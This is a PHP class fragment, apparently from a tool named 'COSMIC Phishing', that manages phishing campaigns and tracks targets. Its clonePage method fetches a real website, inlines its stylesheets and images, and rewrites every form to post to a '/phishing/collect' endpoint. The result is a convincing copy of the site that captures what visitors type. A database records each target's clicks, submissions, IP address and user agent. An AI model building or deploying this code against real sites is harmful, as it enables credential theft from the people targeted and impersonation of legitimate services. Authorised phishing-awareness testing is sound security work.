    public function __construct($config = []) {
        $this->config = array_merge([
            'data_dir'       => dirname(__DIR__, 2) . '/data/phishing/',
            'public_dir'     => dirname(__DIR__, 2) . '/public/phishing/',
            'smtp_host'      => '',
            'smtp_port'      => 587,
            'smtp_user'      => '',
            'smtp_pass'      => '',
            'smtp_encryption' => 'tls',
            'from_email'     => 'noreply@cosmic.local',
            'from_name'      => 'COSMIC Phishing',
            'enable_email'   => false,
            'download_assets' => true,
            'max_asset_size' => 5 * 1024 * 1024,
        ], $config);

        $this->campaignsDir = rtrim($this->config['data_dir'], '/') . '/';
        if (!is_dir($this->campaignsDir)) {
            if (!mkdir($this->campaignsDir, 0755, true)) {
                throw new RuntimeException("Cannot create campaigns directory: {$this->campaignsDir}");
            }
        }
        $this->dbPath = $this->campaignsDir . 'campaigns.db';
        $this->initDB();
    }

    private function initDB() {
        if (!class_exists('SQLite3')) {
            throw new RuntimeException("SQLite3 extension not loaded.");
        }

        try {
            $this->db = new SQLite3($this->dbPath);
            $this->db->busyTimeout(5000);
            $this->db->exec('PRAGMA foreign_keys = ON;');
            $this->db->exec('PRAGMA journal_mode = WAL;');

            $this->db->exec("CREATE TABLE IF NOT EXISTS campaigns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                target_url TEXT,
                clone_path TEXT,
                status TEXT DEFAULT 'draft',
                created_at INTEGER,
                launched_at INTEGER,
                clicks INTEGER DEFAULT 0,
                submissions INTEGER DEFAULT 0,
                emails_sent INTEGER DEFAULT 0,
                email_template TEXT,
                smtp_config TEXT
            )");

            $this->db->exec("CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                email TEXT,
                name TEXT,
                clicked INTEGER DEFAULT 0,
                submitted INTEGER DEFAULT 0,
                user_agent TEXT,
                ip TEXT,
                first_seen INTEGER,
                last_seen INTEGER,
                data TEXT
            )");

            $this->db->exec("CREATE TABLE IF NOT EXISTS emails (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                target_id INTEGER,
                sent_at INTEGER,
                opened INTEGER DEFAULT 0,
                opened_at INTEGER
            )");

            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_targets_campaign ON targets(campaign_id)");
            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_targets_email ON targets(email)");
            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_emails_campaign ON emails(campaign_id)");
            $this->db->exec("CREATE INDEX IF NOT EXISTS idx_emails_target ON emails(target_id)");

            $this->migrate();

        } catch (Exception $e) {
            throw new RuntimeException("Database initialization failed: " . $e->getMessage());
        }
    }

    private function migrate() {
        $columns = $this->getTableColumns('campaigns');
        if (!in_array('status', $columns)) {
            $this->db->exec("ALTER TABLE campaigns ADD COLUMN status TEXT DEFAULT 'draft'");
        }
        if (!in_array('launched_at', $columns)) {
            $this->db->exec("ALTER TABLE campaigns ADD COLUMN launched_at INTEGER");
        }
        if (!in_array('email_template', $columns)) {
            $this->db->exec("ALTER TABLE campaigns ADD COLUMN email_template TEXT");
        }
        if (!in_array('smtp_config', $columns)) {
            $this->db->exec("ALTER TABLE campaigns ADD COLUMN smtp_config TEXT");
        }

        $columns = $this->getTableColumns('targets');
        if (!in_array('data', $columns)) {
            $this->db->exec("ALTER TABLE targets ADD COLUMN data TEXT");
        }
        if (!in_array('first_seen', $columns)) {
            $this->db->exec("ALTER TABLE targets ADD COLUMN first_seen INTEGER");
        }
        if (!in_array('last_seen', $columns)) {
            $this->db->exec("ALTER TABLE targets ADD COLUMN last_seen INTEGER");
        }

        $columns = $this->getTableColumns('emails');
        if (!in_array('opened', $columns)) {
            $this->db->exec("ALTER TABLE emails ADD COLUMN opened INTEGER DEFAULT 0");
        }
        if (!in_array('opened_at', $columns)) {
            $this->db->exec("ALTER TABLE emails ADD COLUMN opened_at INTEGER");
        }
    }

    private function getTableColumns($table) {
        $result = $this->db->query("PRAGMA table_info($table)");
        $columns = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $columns[] = $row['name'];
        }
        return $columns;
    }

    public function createCampaign($name, $targetUrl, $emailTemplate = '') {
        if (!filter_var($targetUrl, FILTER_VALIDATE_URL)) {
            throw new InvalidArgumentException("Invalid target URL.");
        }
        $stmt = $this->db->prepare("INSERT INTO campaigns (name, target_url, email_template, status, created_at) VALUES (:name, :url, :template, 'draft', :time)");
        if (!$stmt) {
            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
        }
        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
        $stmt->bindValue(':url', $targetUrl, SQLITE3_TEXT);
        $stmt->bindValue(':template', $emailTemplate, SQLITE3_TEXT);
        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
        if (!$stmt->execute()) {
            throw new RuntimeException("Failed to create campaign: " . $this->db->lastErrorMsg());
        }
        return $this->db->lastInsertRowID();
    }

    // ==================== ENHANCED CLONEPAGE – INDUSTRIAL GRADE ====================
    public function clonePage($campaignId, $url = null) {
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) {
            throw new InvalidArgumentException("Campaign not found.");
        }
        $url = $url ?: $campaign['target_url'];

        $html = $this->fetchUrl($url);
        if ($html === false) {
            throw new RuntimeException("Failed to fetch URL: $url");
        }

        $dom = new DOMDocument();
        libxml_use_internal_errors(true);
        $dom->loadHTML($html, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
        libxml_clear_errors();

        $forms = $dom->getElementsByTagName('form');
        foreach ($forms as $form) {
            $form->setAttribute('action', '/phishing/collect?campaign=' . $campaignId);
            $form->setAttribute('method', 'post');
        }

        if ($this->config['download_assets']) {
            $this->embedAssets($dom, $url);
        }

        $html = $dom->saveHTML();

        $publicBase = rtrim($this->config['public_dir'], '/') . '/pages/';
        if (!is_dir($publicBase)) {
            if (!mkdir($publicBase, 0755, true)) {
                throw new RuntimeException("Failed to create public pages directory: $publicBase");
            }
        }

        $cloneDir = $publicBase . preg_replace('/[^a-z0-9_-]/i', '_', $campaign['name']) . '/';
        if (!is_dir($cloneDir) && !mkdir($cloneDir, 0755, true)) {
            throw new RuntimeException("Failed to create clone directory: $cloneDir");
        }
        $clonePath = $cloneDir . 'index.html';
        if (file_put_contents($clonePath, $html) === false) {
            throw new RuntimeException("Failed to write clone file: $clonePath");
        }

        $publicPath = '/phishing/pages/' . basename($cloneDir) . '/';

        $stmt = $this->db->prepare("UPDATE campaigns SET clone_path = :path, target_url = :url WHERE id = :id");
        if (!$stmt) {
            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
        }
        $stmt->bindValue(':path', $publicPath, SQLITE3_TEXT);
        $stmt->bindValue(':url', $url, SQLITE3_TEXT);
        $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
        $stmt->execute();

        return $publicPath;
    }

    private function fetchUrl($url) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            CURLOPT_HEADER => false,
            CURLOPT_ENCODING => '',
            CURLOPT_HTTPHEADER => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Cache-Control: no-cache',
                'Pragma: no-cache',
                'DNT: 1',
            ],
        ]);

        $html = curl_exec($ch);
        $error = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($html === false || $httpCode >= 400) {
            error_log("cURL error: $error, HTTP code: $httpCode");
            return false;
        }
        return $html;
    }

    private function embedAssets($dom, $baseUrl) {
        $baseParts = parse_url($baseUrl);
        $baseScheme = $baseParts['scheme'] ?? 'http';
        $baseHost = $baseParts['host'] ?? '';

        // Process CSS links
        $links = $dom->getElementsByTagName('link');
        foreach ($links as $link) {
            $rel = $link->getAttribute('rel');
            if (strtolower($rel) === 'stylesheet') {
                $href = $link->getAttribute('href');
                if (!$href) continue;
                $cssUrl = $this->resolveUrl($href, $baseScheme, $baseHost, $baseUrl);
                if ($cssUrl) {
                    $cssContent = $this->fetchUrl($cssUrl);
                    if ($cssContent) {
                        $cssContent = $this->embedCssAssets($cssContent, $cssUrl, $baseScheme, $baseHost);
                        $style = $dom->createElement('style', $cssContent);
                        $link->parentNode->replaceChild($style, $link);
                    }
                }
            }
        }

        // Process images
        $images = $dom->getElementsByTagName('img');
        foreach ($images as $img) {
            $src = $img->getAttribute('src');
            if (!$src) continue;
            $imgUrl = $this->resolveUrl($src, $baseScheme, $baseHost, $baseUrl);
            if ($imgUrl) {
                $imgData = $this->fetchUrl($imgUrl);
                if ($imgData && strlen($imgData) < $this->config['max_asset_size']) {
                    $finfo = finfo_open(FILEINFO_MIME_TYPE);
                    $mime = finfo_buffer($finfo, $imgData);
                    finfo_close($finfo);
                    $dataUri = 'data:' . $mime . ';base64,' . base64_encode($imgData);
                    $img->setAttribute('src', $dataUri);
                }
            }
        }
    }

    private function embedCssAssets($css, $cssUrl, $scheme, $host) {
        return preg_replace_callback('/url\([\'"]?([^\'")]+)[\'"]?\)/', function($m) use ($cssUrl, $scheme, $host) {
            $assetUrl = $this->resolveUrl($m[1], $scheme, $host, $cssUrl);
            if (!$assetUrl) return $m[0];
            $data = $this->fetchUrl($assetUrl);
            if (!$data || strlen($data) >= $this->config['max_asset_size']) return $m[0];
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_buffer($finfo, $data);
            finfo_close($finfo);
            $dataUri = 'data:' . $mime . ';base64,' . base64_encode($data);
            return 'url("' . $dataUri . '")';
        }, $css);
    }

    private function resolveUrl($url, $scheme, $host, $baseUrl) {
        if (preg_match('/^https?:\/\//i', $url)) return $url;
        if (substr($url, 0, 2) === '//') return $scheme . ':' . $url;
        if (substr($url, 0, 1) === '/') return $scheme . '://' . $host . $url;
        $basePath = preg_replace('/\/[^\/]*$/', '/', $baseUrl);
        return $basePath . $url;
    }

